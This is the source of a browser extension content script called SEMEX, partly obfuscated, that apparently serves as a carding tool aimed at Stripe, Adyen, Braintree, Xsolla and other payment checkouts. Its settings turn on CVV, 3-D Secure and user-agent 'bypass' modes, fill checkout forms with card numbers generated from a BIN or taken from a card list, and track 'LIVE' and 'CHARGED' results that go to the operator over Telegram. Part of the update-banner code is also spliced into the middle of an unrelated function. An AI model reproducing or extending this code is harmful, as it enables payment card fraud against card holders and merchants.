var __defProp = Object.defineProperty;
var __name = (_0x58ccee, _0x29e41f) => __defProp(_0x58ccee, "name", {
  value: _0x29e41f,
  configurable: true
});
const IS_MAIN_FRAME = window.top === window.self;
const _logHistory = new Set();
function logOnce(_0x23e52b, _0x1d5f85, ..._0x3ea74a) {
  if (!_logHistory.has(_0x23e52b)) {
    _logHistory.add(_0x23e52b);

// ─── Extension-outdated FULL PAYWALL (v2.3.6) ─────────────────────────────
// Whenever the extension is flagged outdated we render a hard-block modal on
// every payment-gateway page (Stripe / Xsolla / Roblox / Epic). The modal
// covers the viewport, disables all form input on the host page, prevents
// scrolling, and cannot be dismissed. On non-gateway pages we fall back to
// a top banner so the user still sees the warning while browsing.
const _SEMEX_GATEWAY_HOST_RX = /(^|\.)(stripe\.com|xsolla\.com|roblox\.com|epicgames\.com)$/i;
function _semexIsGatewayHost() {
  try { return _SEMEX_GATEWAY_HOST_RX.test(window.location.hostname || ""); } catch (_e) { return false; }
}
function _semexSafeUrl(u) {
  // BUGFIX: version-gate URLs came straight from the API response into href
  // attributes — a hostile/compromised response could inject javascript: URLs.
  // Only http(s) links are allowed through.
  try {
    const p = new URL(String(u || ""));
    return (p.protocol === "https:" || p.protocol === "http:") ? p.href : "";
  } catch (_e) { return ""; }
}
function _semexShowUpdatePaywall(info) {
  try {
    if (document.getElementById("semex-outdated-paywall")) return;
    const bh = _semexSafeUrl(info && info.botLink);
    const dl = _semexSafeUrl(info && info.downloadUrl);
    const min = String((info && info.minVersion) || "?").replace(/</g, '&lt;');
    const cur = String((info && info.sentVersion) || (chrome && chrome.runtime && chrome.runtime.getManifest ? chrome.runtime.getManifest().version : "?")).replace(/</g, '&lt;');
    const botUser = String((info && info.botUsername) || "Semexautoxbot").replace(/^@/, "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    const wrap = document.createElement("div");
    wrap.id = "semex-outdated-paywall";
    wrap.setAttribute("data-testid", "checkout-paywall");
    wrap.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(6,4,14,0.97);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;padding:24px;font:400 14px/1.4 -apple-system,'Segoe UI',Roboto,sans-serif;color:#fff;pointer-events:auto;";
    wrap.innerHTML =
      '<div style="max-width:460px;width:100%;background:linear-gradient(135deg,rgba(50,20,80,0.75),rgba(30,10,50,0.95));border:1px solid rgba(255,120,200,0.4);border-radius:20px;padding:32px 28px;box-shadow:0 24px 60px rgba(0,0,0,0.55);text-align:center;">' +
        '<div style="font-size:56px;line-height:1;margin-bottom:12px;">🔒</div>' +
        '<h2 style="margin:0 0 6px 0;font-size:1.6rem;background:linear-gradient(135deg,#ff9dcc,#c8a4ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;letter-spacing:0.3px;">SEMEX Locked</h2>' +
        '<div style="color:rgba(255,255,255,0.72);font-size:0.9rem;margin-bottom:16px;">Your extension is out of date. Update to continue.</div>' +
        '<div style="background:rgba(0,0,0,0.32);border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:14px 16px;margin-bottom:18px;font-size:0.85rem;line-height:1.55;">' +
          '<div style="display:flex;justify-content:space-between;"><span style="color:rgba(255,255,255,0.55);">Installed</span><span style="font-family:ui-monospace,monospace;color:#ff9aa8;font-weight:700;">v' + cur + '</span></div>' +
          '<div style="display:flex;justify-content:space-between;margin-top:5px;"><span style="color:rgba(255,255,255,0.55);">Required</span><span style="font-family:ui-monospace,monospace;color:#6bffb8;font-weight:700;">v' + min + '</span></div>' +
        '</div>' +
        '<p style="font-size:0.88rem;color:rgba(255,255,255,0.8);margin:0 0 20px 0;line-height:1.5;">All SEMEX features are disabled on this page until you upgrade. Download the latest build below or open the bot.</p>' +
        (dl ? '<a href="' + dl + '" target="_blank" rel="noopener" data-testid="paywall-download" style="display:block;text-align:center;padding:14px 20px;background:linear-gradient(135deg,#8b5cf6,#c8a4ff);color:#fff;border-radius:12px;text-decoration:none;font-weight:700;letter-spacing:0.4px;margin-bottom:10px;box-shadow:0 8px 22px rgba(139,92,246,0.4);">⬇ Download New Version</a>' : '') +
        (bh ? '<a href="' + bh + '" target="_blank" rel="noopener" data-testid="paywall-bot" style="display:block;text-align:center;padding:11px 18px;background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.15);border-radius:12px;text-decoration:none;font-weight:600;font-size:0.86rem;">Open @' + botUser + ' → send <code style="background:rgba(0,0,0,0.4);padding:2px 6px;border-radius:4px;font-family:ui-monospace,monospace;">/get</code></a>' : '') +
        '<div style="margin-top:16px;font-size:0.72rem;color:rgba(255,255,255,0.4);letter-spacing:0.3px;">SEMEX v' + cur + ' → v' + min + ' upgrade required · This page is frozen until you update.</div>' +
      '</div>';
    // Block clicks/keys on the host page too
    const stop = (e) => { e.stopPropagation(); };
    wrap.addEventListener("click", (e) => { if (e.target === wrap) e.stopPropagation(); }, true);
    (document.body || document.documentElement).appendChild(wrap);
    try {
      document.documentElement.style.overflow = "hidden";
      if (document.body) document.body.style.overflow = "hidden";
    } catch (_e) {}
    // Signal any listening MAIN-world scripts (overlay.js, interceptor.js) to
    // disable themselves.
    try { window.postMessage({ type: "__SEMEX_LOCKED_OUTDATED__", info: info || {} }, "*"); } catch (_e) {}
  } catch (_e) {}
}
function _semexShowUpdateBanner(info) {
  // v2.8.6 — owner directive (public test phase): old versions must NOT be
  // blocked. The outdated notice is now a slim, dismissible banner only —
  // never the page-freezing paywall. All features keep working regardless.
  try {
    if (document.getElementById("semex-outdated-banner")) return;
    const bh = _semexSafeUrl(info && info.botLink);
    const dl = _semexSafeUrl(info && info.downloadUrl);
    const min = (info && info.minVersion) || "?";
    const el = document.createElement("div");
    el.id = "semex-outdated-banner";
    el.style.cssText = "position:fixed;top:0;left:0;right:0;z-index:2147483647;background:linear-gradient(90deg,rgba(20,14,40,0.97),rgba(40,20,70,0.97));color:#fff;padding:10px 16px;font:600 13px/1.35 -apple-system,'Segoe UI',Roboto,sans-serif;box-shadow:0 4px 20px rgba(0,0,0,0.35);display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;border-bottom:1px solid rgba(200,164,255,0.35);";
    el.innerHTML =
      '<span>⚠ SEMEX <b>v' + String(min).replace(/</g, '&lt;') + '</b> is available — you can keep working, updating is recommended.</span>' +
      '<span style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">' +
        (dl ? '<a href="' + dl + '" target="_blank" rel="noopener" style="background:linear-gradient(135deg,#8b5cf6,#c8a4ff);color:#fff;padding:6px 12px;border-radius:6px;text-decoration:none;font-weight:700;">⬇ Download</a>' : '') +
        (bh ? '<a href="' + bh + '" target="_blank" rel="noopener" style="background:rgba(255,255,255,0.1);color:#fff;padding:6px 12px;border-radius:6px;text-decoration:none;font-weight:600;">Open bot → /get</a>' : '') +
        '<button id="semex-outdated-dismiss" aria-label="Dismiss" style="background:transparent;border:none;color:rgba(255,255,255,0.6);font-size:18px;cursor:pointer;padding:2px 6px;line-height:1;">×</button>' +
      '</span>';
    (document.body || document.documentElement).appendChild(el);
    const _x = el.querySelector("#semex-outdated-dismiss");
    if (_x) _x.addEventListener("click", () => { try { el.remove(); } catch (_e) {} });
    // Auto-dismiss after 30 s so it never lingers over a checkout.
    setTimeout(() => { try { el.remove(); } catch (_e) {} }, 30000);
  } catch (_e) {}
}
function _semexRenderOutdatedUI(info) {
  // Never freeze the page (v2.8.6). Advisory banner everywhere; nothing is
  // disabled. The hard paywall (_semexShowUpdatePaywall) is intentionally no
  // longer called — the owner re-enables restriction later, not now.
  _semexShowUpdateBanner(info);
}
// Proactive version-check on load — every page. This is what actually turns
// the block into a paywall (no user action required, no need to open popup).
async function _semexProactiveVersionCheck() {
  try {
    if (window.top !== window) return;  // top frame only
    const localVer = (chrome && chrome.runtime && chrome.runtime.getManifest) ? (chrome.runtime.getManifest().version || "") : "";
    if (!localVer) return;
    // Ask background for the base URL (server-client is loaded there).
    const baseResp = await new Promise((res) => {
      try {
        chrome.runtime.sendMessage({ type: "SEMEX_GET_API_URL" }, (r) => {
          if (chrome.runtime.lastError) return res(null);
          res(r || null);
        });
      } catch (_e) { res(null); }
    });
    const base = baseResp && baseResp.baseUrl;
    if (!base) return;
    const r = await fetch(base + "/api/public/version", { cache: "no-store" });
    if (!r.ok) return;
    const info = await r.json();
    const minV = info && info.minVersion || "0.0.0";
    const cmp = (function () {
      const a = String(localVer).split(".").map(x => parseInt(x, 10) || 0);
      const b = String(minV).split(".").map(x => parseInt(x, 10) || 0);
      const n = Math.max(a.length, b.length);
      for (let i = 0; i < n; i++) { const av = a[i] || 0, bv = b[i] || 0; if (av !== bv) return av - bv; }
      return 0;
    })();
    if (cmp < 0) {
      const payload = {
        required: true,
        sentVersion: localVer,
        minVersion: minV,
        latestVersion: info.latestVersion || minV,
        downloadUrl: info.downloadUrl || "",
        botLink: info.botLink || "",
        botCommand: info.botCommand || "/get",
        botUsername: info.botUsername || "Semexautoxbot",
        message: info.message || "",
        detectedAt: Date.now(),
      };
      try { await chrome.storage.local.set({ __xugr: payload }); } catch (_e) {}
      const show = () => _semexRenderOutdatedUI(payload);
      if (document.body) show(); else document.addEventListener("DOMContentLoaded", show);
    } else {
      // Version healthy — clear any stale flag + remove any leftover UI.
      try { await chrome.storage.local.remove("__xugr"); } catch (_e) {}
      const el1 = document.getElementById("semex-outdated-paywall");
      const el2 = document.getElementById("semex-outdated-banner");
      if (el1) el1.remove();
      if (el2) el2.remove();
    }
  } catch (_e) {}
}
(async function _semexCheckOutdatedOnLoad() {
  try {
    if (typeof window === "undefined" || window.top !== window) return;
    // 1. Immediate paint from cached flag (no network wait).
    const s = await chrome.storage.local.get(["__xugr"]);
    if (s && s.__xugr && s.__xugr.required) {
      const show = () => _semexRenderOutdatedUI(s.__xugr);
      if (document.body) show(); else document.addEventListener("DOMContentLoaded", show);
    }
    // 2. Background broadcasts from popup/service-worker.
    chrome.runtime.onMessage.addListener((m) => {
      if (m && m.type === "SEMEX_UPGRADE_REQUIRED" && m.info) _semexRenderOutdatedUI(m.info);
    });
    // 3. Proactive check against /api/public/version (fires on every top-frame load).
    _semexProactiveVersionCheck();
  } catch (_e) {}
})();


  }
}
__name(logOnce, "logOnce");
function safeSendMessage(_0x190266) {
  return new Promise(_0x456cb3 => {
    if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.id) {
      _0x456cb3(null);
      return;
    }
    try {
      chrome.runtime.sendMessage(_0x190266, _0x282fbe => {
        if (chrome.runtime.lastError) {
          _0x456cb3(null);
          return;
        }
        _0x456cb3(_0x282fbe);
      });
    } catch (_0x4bc836) {
      _0x456cb3(null);
    }
  });
}
__name(safeSendMessage, "safeSendMessage");
// Last-known-good settings cache: if chrome.storage stalls in a frame (the
// "Filling form..." hang class of bug), fill-path reads fall back to this
// instead of assuming defaults — cardReplacement must never silently turn
// OFF just because one storage read timed out (real PAN would hit the DOM).
let _semexSettingsCache = null;
try {
  chrome.storage.local.get(["settings"], _r => { if (_r && _r.settings) _semexSettingsCache = _r.settings; });
  chrome.storage.onChanged.addListener((_ch, _area) => {
    if (_area === "local" && _ch.settings && _ch.settings.newValue) _semexSettingsCache = _ch.settings.newValue;
  });
} catch (_eSC) {}
const DEFAULT_SETTINGS = {
  cvvBypass: {
    enabled: true,
    gateways: {
      stripe: true,
      adyen: true,
      checkout: true,
      recurly: true,
      xsolla: true,
      braintree: true
    }
  },
  paymentUserAgentBypass: {
    enabled: true
  },
  threeDSBypass: {
    enabled: true
  },
  cardReplacement: {
    enabled: false,
    gateways: {
      stripe: false,
      adyen: false,
      checkout: false,
      recurly: true,
      xsolla: true,
      braintree: true,
      basistheory: true
    }
  },
  binOrCCList: {
    mode: "bin",
    bin: "",
    cvv: "",
    ccList: "",
    expiry: {
      month: "RND",
      year: "RND"
    }
  },
  paymentTracking: {
    enabled: true,
    gateways: {
      stripe: true,
      adyen: true,
      checkout: true,
      recurly: true,
      xsolla: true,
      braintree: true
    },
    showToast: true,
    onlySuccess: false,
    dismissTime: 5
  },
  celebration: {
    confetti: true,
    sound: true,
    volume: 100
  }
};
let lastSoundPlayedAt = 0;
const SOUND_DEDUP_WINDOW = 2000;
const processedPayments = new Map();
const PAYMENT_DEDUP_WINDOW = 2000;
function playSuccessSound(_0x4f45de) {
  const _0x2725df = Date.now();
  if (_0x2725df - lastSoundPlayedAt < SOUND_DEDUP_WINDOW) {
    return;
  }
  lastSoundPlayedAt = _0x2725df;
  try {
    chrome.storage.local.get(["settings"], _0xset => {
      try {
        const _0xst = (_0xset && _0xset.settings) || {};
        if (_0xst.celebration && _0xst.celebration.sound === false) {
          return;
        }
        // v2.8.6 — distinct sounds per outcome: any LIVE-class status
        // (CCN_LIVE / LIVE / 3D_LIVE / …) plays live.mp3; CHARGED/SUCCESS
        // plays success.mp3. Different sound for live vs charged.
        const _0xup = String(_0x4f45de || "").toUpperCase();
        const _0x1e8abf = _0xup.indexOf("LIVE") !== -1 ? "assets/live.mp3" : "assets/success.mp3";
        const _0x3129cd = chrome.runtime.getURL(_0x1e8abf);
        const _0x41e995 = new Audio(_0x3129cd);
        const _0xvol = (_0xst.celebration && typeof _0xst.celebration.volume === "number") ? _0xst.celebration.volume : 100;
        _0x41e995.volume = Math.max(0, Math.min(100, _0xvol)) / 100;
        _0x41e995.play().then(() => {}).catch(_0x1c3c9e => {});
      } catch (_0xinner) {}
    });
  } catch (_0x2be710) {}
}
__name(playSuccessSound, "playSuccessSound");
let _settingsBroadcasted = false;
let _sessionRulesBroadcasted = false;
async function loadAndBroadcastSettings() {
  try {
    const _0x337138 = await chrome.storage.local.get(["settings"]);
    const _0x1856f5 = _0x337138.settings || DEFAULT_SETTINGS;
    window.postMessage({
      type: "SEMEX_SETTINGS_UPDATE",
      settings: _0x1856f5
    }, "*");
    if (IS_MAIN_FRAME && !_settingsBroadcasted) {
      _settingsBroadcasted = true;
    }
  } catch (_0x47418b) {}
}
__name(loadAndBroadcastSettings, "loadAndBroadcastSettings");
chrome.storage.onChanged.addListener((_0x169cca, _0x1ac6ff) => {
  if (_0x1ac6ff === "local" && _0x169cca.settings) {
    const _0xf65efd = _0x169cca.settings.newValue || DEFAULT_SETTINGS;
    window.postMessage({
      type: "SEMEX_SETTINGS_UPDATE",
      settings: _0xf65efd
    }, "*");
  }
});
loadAndBroadcastSettings();
// Heartbeat: update a DOM attribute every 500 ms so the MAIN-world overlay
// can detect whether the isolated content-script bridge is still running.
// The DOM is shared between isolated and MAIN worlds; window.postMessage is
// NOT used here to avoid flooding the message bus.
// Once the chrome API context is invalidated, ticking stops permanently so
// the "invalidated" sentinel written by _semexMarkCtxInvalid cannot be
// overwritten by a subsequent timer fire.
var _semexBridgeInvalidated = false;
(function _semexStartBridgeHeartbeat() {
  try {
    function _tick() {
      if (_semexBridgeInvalidated) return;
      try { document.documentElement.setAttribute("data-semex-bridge", Date.now()); } catch (_e) {}
    }
    _tick();
    setInterval(_tick, 500);
  } catch (_e) {}
})();
async function loadAndBroadcastSessionRules(_0x18d8a1 = 0) {
  try {
    const _0x1e8d0d = await safeSendMessage({
      type: "GET_SESSION_RULES"
    });
    if (_0x1e8d0d && _0x1e8d0d.rules) {
      window.postMessage({
        type: "SEMEX_SESSION_RULES",
        rules: _0x1e8d0d.rules
      }, "*");
      if (typeof StatusParserSetSessionRules === "function") {
        StatusParserSetSessionRules(_0x1e8d0d.rules);
      }
      if (IS_MAIN_FRAME) {}
    } else if (_0x18d8a1 < 5) {
      if (IS_MAIN_FRAME) {}
      setTimeout(() => loadAndBroadcastSessionRules(_0x18d8a1 + 1), 1000);
    } else if (IS_MAIN_FRAME) {}
  } catch (_0x425d87) {
    if (IS_MAIN_FRAME) {}
    if (_0x18d8a1 < 3) {
      setTimeout(() => loadAndBroadcastSessionRules(_0x18d8a1 + 1), 1000);
    }
  }
}
__name(loadAndBroadcastSessionRules, "loadAndBroadcastSessionRules");
loadAndBroadcastSessionRules();
const SMART_BLUR_STYLE_ID = "semex-smart-blur-styles";
function applySmartBlur(_0x447d50) {
  let _0x2795e3 = document.getElementById(SMART_BLUR_STYLE_ID);
  if (_0x447d50) {
    if (!_0x2795e3) {
      _0x2795e3 = document.createElement("style");
      _0x2795e3.id = SMART_BLUR_STYLE_ID;
      _0x2795e3.textContent = "\n                /* ========================================= */\n                /* SMART BLUR - Stripe Checkout Specific     */\n                /* ========================================= */\n\n                /* EMAIL FIELDS */\n                input#email,\n                input[name=\"email\"],\n                input[inputmode=\"email\"],\n                .ReadOnlyFormField-title,\n\n                /* CARD FIELDS (Direct Inputs) */\n                input#cardNumber,\n                input#cardExpiry,\n                input#cardCvc,\n                input[name=\"cardNumber\"],\n                input[name=\"cardExpiry\"],\n                input[name=\"cardCvc\"],\n                input[autocomplete=\"cc-number\"],\n                input[autocomplete=\"cc-exp\"],\n                input[autocomplete=\"cc-csc\"],\n                \n                /* Stripe Elements class-based selectors (for iframes content) */\n                .InputElement,\n                .CardNumberElement input,\n                .CardExpiryElement input,\n                .CardCVCElement input,\n                input.Input,\n\n                /* REMOVED IFRAME SELECTORS - Rely on child frames to blur their own inputs (V1 Parity) */\n                /* Prevents \"Double Blur\" and \"Sticky Blur\" on container */\n                \n                /* Manual blur class */\n                .semex-blur-sensitive {\n                    filter: blur(5px) !important;\n                    transition: filter 0.3s ease !important;\n                }\n\n                /* Unblur on focus */\n                input:focus {\n                    filter: none !important;\n                }\n\n                /* ========================================= */\n                /* EXPLICIT EXCLUSIONS (High Priority)       */\n                /* ========================================= */\n                \n                /* Link Button & Container - FORCE UNBLUR */\n                .LinkButton,\n                .LinkButton *,\n                iframe[title*=\"Link\"], \n                iframe[title*=\"Sign in with Link\"],\n                \n                /* Name & Address */\n                input#billingName,\n                input[name*=\"name\" i]:not(#email):not([name*=\"cardNumber\"]):not([name*=\"cardCvc\"]),\n                input[name*=\"cardholder\" i],\n                input[autocomplete=\"cc-name\"],\n                input[autocomplete=\"name\"],\n                \n                input[name*=\"address\" i],\n                input[name*=\"city\" i],\n                input[name*=\"zip\" i],\n                input[name*=\"postal\" i],\n                input[autocomplete*=\"address\"] {\n                    filter: none !important;\n                }\n            ";
      (document.head || document.documentElement).appendChild(_0x2795e3);
      if (IS_MAIN_FRAME) {}
    }
  } else {
    if (_0x2795e3) {
      _0x2795e3.remove();
      if (IS_MAIN_FRAME) {}
    }
    const _0x59776f = document.createElement("style");
    _0x59776f.textContent = "\n            iframe, input, .InputElement, .CardField, [data-testid*=\"card\"] {\n                filter: none !important;\n                transition: none !important;\n            }\n        ";
    (document.head || document.documentElement).appendChild(_0x59776f);
    setTimeout(() => _0x59776f.remove(), 100);
    const _0x375822 = document.querySelectorAll("iframe, input, .CardField, [data-testid*=\"card\"], .InputElement");
    _0x375822.forEach(_0x1cee58 => {
      if (_0x1cee58.style.filter) {
        _0x1cee58.style.removeProperty("filter");
      }
    });
  }
}
__name(applySmartBlur, "applySmartBlur");
chrome.runtime.onMessage.addListener((_0x165cd1, _0x1c6b0b, _0x1e5552) => {
  if (_0x165cd1.type === "SEMEX_BLUR_COMMAND") {
    applySmartBlur(_0x165cd1.enabled);
  }
  if (_0x165cd1.type === "SEMEX_BACKEND_RESULT") {
    try {
      if (!_0x165cd1.ok) {
        // Show error toasts so the operator knows something went wrong.
        showSemexBackendToast(_0x165cd1.message || "Hit failed to reach server", "error");
      }
      // Success notifications (CHARGED, LIVE, etc.) are intentionally silent on
      // the page — the Telegram hit message is the owner's signal. No celebration
      // animation or "notification sent" popup should appear on the checkout page.
    } catch (e) {}
  }
});
function _semexInjectToastStyles() {
  if (document.getElementById("semex-toast-styles")) return;
  const s = document.createElement("style");
  s.id = "semex-toast-styles";
  s.textContent =
    "@keyframes semexToastIn{0%{transform:translateX(120%) scale(.9);opacity:0}60%{transform:translateX(-6px) scale(1.02)}100%{transform:translateX(0) scale(1);opacity:1}}" +
    "@keyframes semexToastOut{to{transform:translateX(120%);opacity:0}}" +
    "@keyframes semexGlow{0%,100%{box-shadow:0 0 0 1px var(--sx-ac),0 10px 40px rgba(0,0,0,.55)}50%{box-shadow:0 0 0 1px var(--sx-ac),0 10px 55px var(--sx-gl)}}" +
    ".semex-toast{position:fixed;bottom:24px;right:24px;z-index:2147483647;display:flex;align-items:center;gap:12px;" +
    "background:linear-gradient(135deg,#141418,#1c1c22) !important;color:#fff !important;padding:14px 18px;border-radius:14px;" +
    "font:600 13.5px/1.35 ui-sans-serif,system-ui,'Segoe UI',Roboto,sans-serif;max-width:340px;letter-spacing:-.01em;" +
    "border:1px solid rgba(255,255,255,.10);animation:semexToastIn .5s cubic-bezier(.2,.9,.25,1),semexGlow 2.4s ease-in-out infinite .5s;}" +
    ".semex-toast .sx-ic{width:30px;height:30px;flex:0 0 30px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:16px;background:var(--sx-bg);color:var(--sx-ac)}" +
    ".semex-toast .sx-tx b{display:block;font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--sx-ac);margin-bottom:2px}" +
    ".semex-toast .sx-tx span{color:#e5e5ea;font-weight:500}";
  (document.head || document.documentElement).appendChild(s);
}
function showSemexBackendToast(_0xmsg, _variant) {
  try {
    if (window.top !== window) return;
    _semexInjectToastStyles();
    const theme = {
      success: { ac: "#34d399", bg: "rgba(52,211,153,.12)", gl: "rgba(52,211,153,.35)", ic: "\u2713", title: "SEMEX" },
      live: { ac: "#a78bfa", bg: "rgba(167,139,250,.12)", gl: "rgba(167,139,250,.35)", ic: "\uD83D\uDD25", title: "SEMEX" },
      error: { ac: "#f87171", bg: "rgba(248,113,113,.12)", gl: "rgba(248,113,113,.35)", ic: "!", title: "SEMEX" }
    }[_variant || "error"];
    const _0xid = "semex-backend-toast";
    let _0xel = document.getElementById(_0xid);
    if (_0xel) _0xel.remove();
    _0xel = document.createElement("div");
    _0xel.id = _0xid;
    _0xel.className = "semex-toast";
    _0xel.style.setProperty("--sx-ac", theme.ac);
    _0xel.style.setProperty("--sx-bg", theme.bg);
    _0xel.style.setProperty("--sx-gl", theme.gl);
    _0xel.innerHTML = '<div class="sx-ic">' + theme.ic + '</div><div class="sx-tx"><b>' + theme.title + '</b><span></span></div>';
    _0xel.querySelector(".sx-tx span").textContent = String(_0xmsg);
    (document.body || document.documentElement).appendChild(_0xel);
    clearTimeout(window._semexBackendToastTimer);
    window._semexBackendToastTimer = setTimeout(() => {
      try { _0xel.style.animation = "semexToastOut .4s forwards"; setTimeout(() => _0xel.remove(), 450); } catch (e) {}
    }, _variant === "error" ? 8000 : 5000);
  } catch (e) {}
}
function semexCelebrate() {
  try {
    if (window.top !== window) return;
    if (window._semexCelebrating) return;
    window._semexCelebrating = true;
    const cv = document.createElement("canvas");
    cv.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;pointer-events:none;z-index:2147483646;";
    (document.body || document.documentElement).appendChild(cv);
    const ctx = cv.getContext("2d");
    const dpr = window.devicePixelRatio || 1;
    const W = cv.width = innerWidth * dpr, H = cv.height = innerHeight * dpr;
    ctx.scale(dpr, dpr);
    const colors = ["#34d399", "#a78bfa", "#60a5fa", "#fbbf24", "#f472b6", "#ffffff"];
    const N = 160, parts = [];
    for (let i = 0; i < N; i++) {
      parts.push({
        x: innerWidth / 2 + (Math.random() - .5) * 120,
        y: innerHeight / 2 + (Math.random() - .5) * 60,
        vx: (Math.random() - .5) * 16,
        vy: Math.random() * -16 - 5,
        g: .38 + Math.random() * .2,
        s: 5 + Math.random() * 7,
        r: Math.random() * Math.PI,
        vr: (Math.random() - .5) * .3,
        c: colors[(Math.random() * colors.length) | 0],
        life: 1
      });
    }
    const t0 = performance.now();
    function frame(t) {
      const el = t - t0;
      ctx.clearRect(0, 0, innerWidth, innerHeight);
      parts.forEach(p => {
        p.vy += p.g; p.x += p.vx; p.y += p.vy; p.r += p.vr; p.vx *= .99;
        p.life = Math.max(0, 1 - el / 2600);
        ctx.save(); ctx.globalAlpha = p.life; ctx.translate(p.x, p.y); ctx.rotate(p.r);
        ctx.fillStyle = p.c; ctx.fillRect(-p.s / 2, -p.s / 2, p.s, p.s * .6);
        ctx.restore();
      });
      if (el < 2600) requestAnimationFrame(frame);
      else { cv.remove(); window._semexCelebrating = false; }
    }
    requestAnimationFrame(frame);
  } catch (e) { window._semexCelebrating = false; }
}
// BIN library upload trigger (isolated world). The overlay runs in the MAIN
// world where page JS can forge any postMessage — so account-changing saves
// are driven ONLY by trusted user gestures on the overlay's add-BIN controls:
// real clicks/keys carry isTrusted === true, which page JS cannot forge.
// Capture phase runs before the overlay's own (bubble) handler clears the
// input, so the value is read synchronously here.
// null = mode unknown → the save trigger fails closed (no upload) until the
// overlay's settings hydrate this over the message bridge.
let _semexBinModeCache = null;
// Local-only BIN add (owner rule: overlay adds are "use this now", kept
// on-device; named database saves live in the dashboard via SEMEX_SAVE_BIN).
// Defense in depth against forged writes: (1) isTrusted gesture, (2) the
// gesture must land inside the PINNED genuine overlay node — page JS can
// fabricate lookalike DOM, so we capture the first structurally-complete
// overlay and never trust a bare ID selector again, (3) the page must be an
// intended checkout context (known gateway host or actually embedding
// Stripe.js), and (4) the write itself goes through chrome.runtime messaging
// to the service worker, which page JS cannot forge, where a single queue
// serializes storage updates across every tab/frame.
// Overlay provenance: the pin is established by content/overlay-pin.js at
// document_start (isolated world, globals shared with this script) via an
// observer armed BEFORE any page script can build DOM — a page-planted
// lookalike can never win the pin. If the bootstrap did not run in this
// frame, this fails closed (null → local-BIN writes blocked).
function _semexGenuineOverlayRoot() {
  try {
    if (typeof __semexGetPinnedOverlayRoot === "function") return __semexGetPinnedOverlayRoot();
  } catch (_0xePin) {}
  return null;
}
__name(_semexGenuineOverlayRoot, "semexGenuineOverlayRoot");
function _semexMaybeSaveLocalBin(_0xev) {
  try {
    if (!_0xev || _0xev.isTrusted !== true) return;
    const _0xroot = _semexGenuineOverlayRoot();
    if (!_0xroot || !_0xroot.contains(_0xev.target)) return;
    const _0xhost = (location.hostname || "").toLowerCase();
    const _0xgwHost = /(^|\.)(stripe\.com|pay\.openai\.com|adyen\.com|checkout\.com|recurly\.com|xsolla\.com|roblox\.com|epicgames\.com)$/.test(_0xhost);
    let _0xhasStripe = false;
    try { _0xhasStripe = !!document.querySelector("iframe[src*=\"js.stripe.com\"]"); } catch (_0xeF) {}
    if (!_0xgwHost && !_0xhasStripe) return;
    const _0xin = _0xroot.querySelector("#binAddInput");
    if (!_0xin) return;
    const _0xdigits = String(_0xin.value || "").replace(/\D/g, "").slice(0, 8);
    if (_0xdigits.length < 6) return;
    if (_semexBinModeCache !== "bin") return;
    chrome.storage.local.get(["settings"], _0xst => {
      try {
        if (chrome.runtime.lastError) return;
        const _0xm = _0xst.settings && _0xst.settings.binOrCCList && _0xst.settings.binOrCCList.mode;
        // Unset mode defaults to "bin"; this stays a device-local write of the
        // user's own digits either way.
        if (_0xm && _0xm !== "bin") return;
        chrome.runtime.sendMessage({ type: "SEMEX_ADD_LOCAL_BIN", bin: _0xdigits }, () => { void chrome.runtime.lastError; });
      } catch (_0xe) {}
    });
  } catch (_0xe) {}
}
__name(_semexMaybeSaveLocalBin, "semexMaybeSaveLocalBin");
document.addEventListener("click", _0xev => {
  try {
    if (_0xev.target && _0xev.target.closest && _0xev.target.closest("#binAddBtn")) _semexMaybeSaveLocalBin(_0xev);
  } catch (_0xe) {}
}, true);
document.addEventListener("keydown", _0xev => {
  try {
    if (_0xev.key === "Enter" && _0xev.target && _0xev.target.id === "binAddInput") _semexMaybeSaveLocalBin(_0xev);
  } catch (_0xe) {}
}, true);
window.addEventListener("message", _0x2021de => {
  if (_0x2021de.source !== window) {
    return;
  }
  // Track BIN/CC mode synchronously from overlay messages so the BIN-save
  // gesture trigger can fail closed unless BIN mode is positively current —
  // an async storage read here would race the mode toggle and could upload
  // CC-list digits as a BIN (owner rule: CC data never syncs).
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_LIST_MODE") {
    _semexBinModeCache = _0x2021de.data.mode === "ccList" ? "ccList" : "bin";
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SETTINGS_UPDATE") {
    const _0xsm = _0x2021de.data.settings && _0x2021de.data.settings.binOrCCList;
    _semexBinModeCache = (_0xsm && _0xsm.mode) === "ccList" ? "ccList" : "bin";
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_CCLIST_UPDATE") {
    const {
      remainingText: _0x3590d0,
      remainingCount: _0x1467d3
    } = _0x2021de.data;
    chrome.storage.local.get(["settings"], _0x53aa0e => {
      if (chrome.runtime.lastError) {
        return;
      }
      const _0x5a2e31 = _0x53aa0e.settings || DEFAULT_SETTINGS;
      _0x5a2e31.binOrCCList = _0x5a2e31.binOrCCList || {};
      _0x5a2e31.binOrCCList.ccList = _0x3590d0;
      chrome.storage.local.set({
        settings: _0x5a2e31
      }, () => {
        if (chrome.runtime.lastError) {} else if (IS_MAIN_FRAME) {}
      });
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_APPEND_CARD_TO_STORAGE" && _0x2021de.data.cardText) {
    // BUGFIX: serialize appends — concurrent read-modify-write of settings
    // from multiple frames/interceptor events used to silently lose cards.
    // (window.* in an isolated content-script world is invisible to page JS.)
    if (typeof window.__semexCardAppendQ === "undefined") window.__semexCardAppendQ = Promise.resolve();
    const _cardText = String(_0x2021de.data.cardText).slice(0, 10000);
    window.__semexCardAppendQ = window.__semexCardAppendQ.then(() => new Promise(_qres => {
      chrome.storage.local.get(["settings"], _0x2de2e3 => {
        if (chrome.runtime.lastError) {
          _qres();
          return;
        }
